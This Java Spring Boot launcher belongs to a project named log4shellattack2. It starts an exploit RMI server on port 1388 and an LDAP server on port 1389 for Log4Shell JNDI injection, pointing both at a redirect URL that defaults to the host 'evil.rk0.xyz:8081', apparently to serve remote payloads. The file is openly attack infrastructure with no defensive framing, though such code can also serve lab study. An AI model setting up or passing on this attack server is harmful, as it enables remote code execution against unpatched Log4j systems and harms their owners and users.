package com.example.log4shellattack2;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class Log4shellAttack2Application {

    public static void main(String[] args) {
        String redirectUrl = getRedirectUrl();
        new Thread(() -> ExploitRmiServer.init(1388, redirectUrl)).start();
        new Thread(() -> LdapServer.init(1389, redirectUrl)).start();
        SpringApplication.run(Log4shellAttack2Application.class, args);
    }

    public static String getRedirectUrl() {
        String redirectUrl = System.getenv("REDIRECT_URL");
        if(redirectUrl == null) {
            redirectUrl = "http://evil.rk0.xyz:8081/";
        }
        return redirectUrl;
    }

}
